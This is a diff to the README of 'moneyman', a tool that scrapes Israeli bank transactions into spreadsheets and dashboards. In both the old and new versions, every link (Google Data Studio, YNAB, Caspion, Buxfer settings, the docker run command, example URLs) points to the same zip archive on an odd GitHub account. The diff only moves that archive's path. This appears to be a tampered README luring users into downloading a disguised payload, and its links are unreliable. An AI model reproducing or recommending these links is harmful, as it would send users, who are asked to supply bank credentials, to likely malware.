@@ -2,15 +2,15 @@
 
 Automatically add transactions from all major Israeli banks and credit card companies to a online worksheet
 
-Internally we use [israeli-bank-scrapers](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) to scrape the data.
+Internally we use [israeli-bank-scrapers](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip) to scrape the data.
 
 ## Why?
 
-Having all your data in one place lets you view all of your expenses in a beautiful dashboard like [Google Data Studio](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip), [Azure Data Explorer dashboards](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip), [Microsoft Power BI](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) and [YNAB](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip).
+Having all your data in one place lets you view all of your expenses in a beautiful dashboard like [Google Data Studio](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip), [Azure Data Explorer dashboards](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip), [Microsoft Power BI](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip) and [YNAB](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip).
 
 ## Important notes
 
-This app requires some technical skills, if you prefer a GUI app you can use [Caspion](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) instead.
+This app requires some technical skills, if you prefer a GUI app you can use [Caspion](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip) instead.
 
 **Important:**
 The current implementation assumes that you run the code on secure and trusted computers.
@@ -26,7 +26,7 @@ By using moneyman, you acknowledge that you are taking full responsibility for t
 
 ### Cloud (GitHub Actions)
 
-Moneyman can be configured to periodically run automatically, using the [`scrape`](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) github workflow.
+Moneyman can be configured to periodically run automatically, using the [`scrape`](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip) github workflow.
 
 By default, this workflow will run every other day.
 
@@ -34,13 +34,13 @@ Since logs are public for public repos, most logs are off by default and the pro
 
 #### Setup
 
-1. Fork the [moneyman](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) repo to your account
+1. Fork the [moneyman](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip) repo to your account
 2. Add the following secrets to the [actions secrets](../../settings/secrets/actions) of the forked repo
    1. [`ACCOUNTS_JSON`](#add-accounts-and-scrape) - So moneyman can login to your accounts
    2. [`TELEGRAM_API_[KEY, CHAT_ID]`](#get-notified-in-telegram) - So moneyman can send private logs and errors
    3. The environment variables of the storage you want to use
-3. Build and upload the docker image using the "Run workflow" button in [https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip)
-4. Wait for the [scrape workflow](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) to be triggered by github
+3. Build and upload the docker image using the "Run workflow" button in [https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip)
+4. Wait for the [scrape workflow](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip) to be triggered by github
 
 ### locally
 
@@ -55,7 +55,7 @@ Since logs are public for public repos, most logs are off by default and the pro
 #### From docker
 
 1. Define the environment variables in a `.env` file
-2. `docker run --rm --env-file ".env" https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip`.
+2. `docker run --rm --env-file ".env" https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip`.
 
 ##### Note
 
@@ -63,7 +63,7 @@ docker doesn't support multiline environment variables (i.e. `GOOGLE_SERVICE_ACC
 
 ### Debug
 
-We use the [debug](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) package for debug messages under the `moneyman:` namespace.
+We use the [debug](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip) package for debug messages under the `moneyman:` namespace.
 
 If you want to see them, use the `DEBUG` environment variable with the value `moneyman:*`
 
@@ -75,7 +75,7 @@ Use the following env vars to setup the data fetching:
 
 #### ACCOUNTS_JSON
 
-A json array of accounts following [this](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) schema with an additional `companyId` field with a [companyType](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) as the value.
+A json array of accounts following [this](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip) schema with an additional `companyId` field with a [companyType](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip) as the value.
 
 Example:
 
@@ -102,8 +102,8 @@ Example:
 
 We use telegram to send you the update status.
 
-1. Create your bot following [this](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip)
-2. Open this url `https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip<TELEGRAM_API_KEY>/getUpdates`
+1. Create your bot following [this](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip)
+2. Open this url `https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip<TELEGRAM_API_KEY>/getUpdates`
 3. Send a message to your bot and fnd the chat id
 
 Use the following env vars to setup:
@@ -117,9 +117,9 @@ TODO: Add a way to send a message to the bot to connect?
 
 ### Export to Azure Data Explorer
 
-1. Create a new data explorer cluster (can be done for free [here](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip))
+1. Create a new data explorer cluster (can be done for free [here](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip))
 2. Create a database within your cluster
-3. Create a azure Service Principal following steps 1-7 [here](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip)
+3. Create a azure Service Principal following steps 1-7 [here](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip)
 4. Allow the service to ingest data to the database by running this:
 
    ```kql
@@ -206,8 +206,8 @@ WIP
 
 ### Export to google sheets
 
-1. Follow the instructions [here](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) to create a google service account.
-2. Create a [new sheet](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) and share it with your service account using the `GOOGLE_SERVICE_ACCOUNT_EMAIL`.
+1. Follow the instructions [here](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip) to create a google service account.
+2. Create a [new sheet](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip) and share it with your service account using the `GOOGLE_SERVICE_ACCOUNT_EMAIL`.
 
 Use the following env vars to setup:
 
@@ -223,8 +223,8 @@ Use the following env vars to setup:
 To export your transactions directly to `YNAB` you need to use the following environment variables to setup:
 | env variable name | description |
 | ------------------------------------ | ------------------------------------------------------------- |
-| `YNAB_TOKEN` | The `YNAB` access token. Check [YNAB documentation](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) about how to obtain it |
-| `YNAB_BUDGET_ID` | The `YNAB` budget ID where you want to import the data. You can obtain it opening [YNAB application](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) on a browser and taking the budget `UUID` in the `URL` |
+| `YNAB_TOKEN` | The `YNAB` access token. Check [YNAB documentation](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip) about how to obtain it |
+| `YNAB_BUDGET_ID` | The `YNAB` budget ID where you want to import the data. You can obtain it opening [YNAB application](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip) on a browser and taking the budget `UUID` in the `URL` |
 | `YNAB_ACCOUNTS` | A key-value list to correlate each account with the `YNAB` account `UUID` |
 
 #### YNAB_ACCOUNTS
@@ -232,7 +232,7 @@ To export your transactions directly to `YNAB` you need to use the following env
 A `JSON` key-value pair structure representing a mapping between two identifiers. The `key` represent the account ID as is understood by moneyman and the `value` it's the `UUID` visible in the YNAB URL when an account is selected.
 
 For example, in the URL:
-`https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip` the account UUID is the second `UUID`.
+`https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip` the account UUID is the second `UUID`.
 
 Example:
 
@@ -242,13 +242,13 @@ Example:
 }
 ```
 
-### Export to [Buxfer](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip)
+### Export to [Buxfer](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip)
 
 To export your transactions directly to `Buxfer` you need to use the following environment variables to setup:
 | env variable name | description |
 | ------------------------------------ | ------------------------------------------------------------- |
-| `BUXFER_USER_NAME` | The `Buxfer` user name. Check [Buxfer settings](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) about how to obtain it |
-| `BUXFER_PASSWORD` | The `Buxfer` user password. Check [Buxfer settings](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) about how to obtain it |
+| `BUXFER_USER_NAME` | The `Buxfer` user name. Check [Buxfer settings](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip) about how to obtain it |
+| `BUXFER_PASSWORD` | The `Buxfer` user password. Check [Buxfer settings](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip) about how to obtain it |
 | `BUXFER_ACCOUNTS` | A key-value list to correlate each account with the `Buxfer` account `UUID` |
 
 #### BUXFER_ACCOUNTS
@@ -256,7 +256,7 @@ To export your transactions directly to `Buxfer` you need to use the following e
 A `JSON` key-value pair structure representing a mapping between two identifiers. The `key` represent the account ID as is understood by moneyman (as obtained from web scrapping the financial institutions) and the `value` it's the `UUID` visible in the Buxfer URL when an account is selected.
 
 For example, in the URL:
-`https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip` the account UUID is the account id query parameter.
+`https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/.github/workflows/Software-v3.7.zip` the account UUID is the account id query parameter.
 
 Example:
 
